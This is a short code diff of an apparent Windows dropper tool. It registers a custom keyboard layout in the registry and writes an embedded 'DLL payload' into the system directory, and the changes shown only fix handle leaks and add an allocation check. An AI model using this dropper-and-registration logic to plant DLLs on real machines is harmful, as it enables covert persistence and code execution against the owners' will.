@@ -165,6 +165,7 @@ bool Install::CreateValuesSubkey(const HKEY& hKey, PLAYOUTID playoutStruct)
 		std::wprintf(L"Could not create values for %s.\n", subkey);
 		return false;
 	}
+	RegCloseKey(hSubKey);
 	return true;
 }
 
@@ -180,9 +181,9 @@ auto Install::InstallCustomLayout(PLAYOUTID playoutStruct) -> bool
 			&& InstallLayoutOption2(playoutStruct)
 			)
 		{
-			RegCloseKey(hLocalMachine);
 			retVal = true;
 		}
+		RegCloseKey(hLocalMachine);
 	}
 	return retVal;
 }
@@ -205,6 +206,12 @@ bool Dropper::DropDllPayload(void) noexcept
 	}
 	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
 	LPSTR pathPayload = new char[MAX_PATH];
+	if (pathPayload == NULL)
+	{
+		printf("Could not allocate memory for pathPayload, exiting...\n");
+		return false;
+	}
+	
 	GetSystemDirectoryA(pathPayload, MAX_PATH);
 
 	//Here the path is hardcoded but you can use your own DLL payload.
